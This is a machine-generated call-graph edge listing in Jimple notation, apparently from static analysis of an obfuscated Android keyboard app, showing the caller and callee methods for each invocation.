STATIC edge: $l1 = staticinvoke <java.lang.System: long nanoTime()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long nanoTime()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkg: void <init>(int)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>
VIRTUAL edge: $r12 = virtualinvoke $r6.<lkt: lkx l()>() in <lmb: lme f()> ==> <lkt: lkx l()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lsg: void <init>()> ==> <lsv: void <init>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r1.<lvs: void <init>(java.lang.String,int)>("STRING", 1) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int length()>() in <ivw: java.lang.String p()> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: int b()> ==> <ljf: boolean m()>
STATIC edge: $r0 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r15.<lvr: void <init>(lvr,lvr)>($r16, $r17) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvr: void <init>(lvr,lvr)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void l(int)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
STATIC edge: $i4 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c3) in <nzh: boolean f(ivv)> ==> <ivw: boolean A(char)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
CLINIT edge: staticinvoke <lsh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsh: void <clinit>()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(hff,java.lang.Class,ldp)>($r18, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(hff,java.lang.Class,ldp)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
STATIC edge: $r6 = staticinvoke <lqq: lqq a(int,java.lang.Object[])>(4, $r9) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lqq: lqq a(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(10) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int b(java.lang.Object[],int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: specialinvoke $r6.<ltc: void <init>(java.lang.String,int,int)>("NONE", 4, 0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int c()> ==> <java.lang.UnsupportedOperationException: void <init>()>
SPECIAL edge: $z0 = specialinvoke r0.<lsn: boolean ac()>() in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: boolean ac()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Language tag type is set to ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(boolean[],boolean[])>($r18, $r19) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(boolean[],boolean[])>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int b(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int b(java.lang.Class)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: boolean hasNext()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r5, $i6, $i1) in <ljf: boolean add(java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: java.lang.Object[] s()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r2.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: boolean add(java.lang.Object)> ==> <java.lang.UnsupportedOperationException: void <init>()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljf: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke $r23.<mag: void <init>(java.lang.String,int,int)>("PLAYSTORE_STICKER_IMAGE", 23, 23) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.LinkageError: void <init>()>() in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.LinkageError: void <init>()>
SPECIAL edge: specialinvoke r0.<lka: void <init>()>() in <mii: void <init>()> ==> <lka: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfc: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r2) in <ivv: ivw a()> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
CLINIT edge: staticinvoke <ivw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ivw: void <clinit>()>
SPECIAL edge: specialinvoke $r11.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_METADATA", 11, 11) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<ljd: int size()>() in <ljb: void a()> ==> <ljd: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("iw", "he") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <ljf: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lwa: void <init>()>() in <lwa: void <clinit>()> ==> <lwa: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <ljf: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, 0) in <lql: void <clinit>()> ==> <lql: void <init>(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("in", "id") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <jpq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jpq: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashMap: void <init>(int,float)>($i0, 1.0F) in <ljd: java.util.Map n(int)> ==> <java.util.LinkedHashMap: void <init>(int,float)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<androidx.core.content.FileProvider: void attachInfo(android.content.Context,android.content.pm.ProviderInfo)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void attachInfo(android.content.Context,android.content.pm.ProviderInfo)>
SPECIAL edge: specialinvoke $r3.<lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>($r0, $r1, $i0, $r2) in <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i2, $i7) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
CLINIT edge: staticinvoke <java.lang.System: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.System: void <clinit>()>
STATIC edge: $r3 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <iwt: java.lang.String c(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int j()> ==> <java.lang.UnsupportedOperationException: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r0.<java.util.List: boolean isEmpty()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: boolean isEmpty()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c2) in <ivw: boolean v(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <ljf: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(0) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <liz: void b()> ==> <java.util.ConcurrentModificationException: void <init>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r3.<java.lang.AssertionError: void <init>(java.lang.Object)>($r1) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(10) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
SPECIAL edge: specialinvoke $r2.<lfc: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfc: void <init>(lfa)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>("unbounded recursion in log statement", r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int a(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int a(java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkt: void e(int)>($i0) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <lkt: void e(int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r7 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r6) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r4.<j$.util.concurrent.v: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.v: void <init>()>
SPECIAL edge: $r12 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r10, $i3) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>($r2, $i1, $i0) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.v: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<java.lang.StringBuilder: void <init>()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r3, "logSiteKey") in <lsn: boolean ac()> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<ltf: void <init>(lto)>($r1) in <lth: void <init>(lto)> ==> <ltf: void <init>(lto)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkt: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void j(int[],int[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(6) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <liz: boolean hasNext()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqm: int size()>
SPECIAL edge: specialinvoke $r2.<lsk: void <init>(java.lang.Class)>(class "Llvt;") in <lsl: void <clinit>()> ==> <lsk: void <init>(java.lang.Class)>
CLINIT edge: staticinvoke <lsu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsu: void <clinit>()>
SPECIAL edge: specialinvoke $r5.<java.util.WeakHashMap: void <init>()>() in <hcb: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(5) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int d(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: int d(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
STATIC edge: staticinvoke <java.lang.Thread: void yield()>() in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <java.lang.Thread: void yield()>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("initialized", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
CLINIT edge: staticinvoke <miv: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <miv: void <clinit>()>
SPECIAL edge: specialinvoke r0.<liz: void <init>(ljd)>($r1) in <liw: void <init>(ljd)> ==> <liz: void <init>(ljd)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int c()>() in <ljd: java.util.Map m()> ==> <ljd: int c()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorFeaturedMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r1.<jlu: void <init>(int)>(9) in <lvt: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $l0 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <android.os.SystemClock: long elapsedRealtime()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma g()>() in <lkx: lma q()> ==> <lqq: lma g()>
SPECIAL edge: specialinvoke $r2.<j$.sun.misc.b: void <init>(sun.misc.Unsafe)>($r4) in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: void <init>(sun.misc.Unsafe)>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/libs/framework/core/AppBase") in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <ltr: lsz c(int)>
STATIC edge: $z0 = staticinvoke <lri: boolean V(java.util.List,java.lang.Object)>(r0, $r1) in <lkq: boolean equals(java.lang.Object)> ==> <lri: boolean V(java.util.List,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <lma: lma r(java.lang.Object)>($r5) in <lly: lma g()> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
STATIC edge: staticinvoke <izw: void as(int,java.lang.String)>($i0, "initialCapacity") in <lkg: void <init>(int)> ==> <izw: void as(int,java.lang.String)>
SPECIAL edge: specialinvoke $r20.<mag: void <init>(java.lang.String,int,int)>("NATIVE_CARD", 20, 20) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <lum: lto d(java.lang.String)>($r2) in <lth: lth i(java.lang.String)> ==> <lum: lto d(java.lang.String)>
VIRTUAL edge: $r18 = virtualinvoke r0.<lsn: lsc c()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsf: lsc c()>
STATIC edge: $r1 = staticinvoke <iwt: java.lang.String d(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <iwt: java.lang.String d(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <ltc: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r6.<lkt: void a(java.lang.Object,java.lang.Object)>($r3, $r11) in <lmb: lme f()> ==> <lkt: void a(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <ljf: void q(int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(short[],short[])>($r6, $r7) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(short[],short[])>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentMask", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(11) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r15 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<qj: void <init>()>() in <qc: void <init>()> ==> <qj: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.util.Iterator l()>() in <liy: java.util.Iterator iterator()> ==> <ljd: java.util.Iterator l()>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <ljd: void A(int)>
SPECIAL edge: specialinvoke $r1.<lqm: void <init>(lqn)>(r0) in <lqn: lkq f()> ==> <lqm: void <init>(lqn)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(18) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: java.lang.String replace(char,char)>
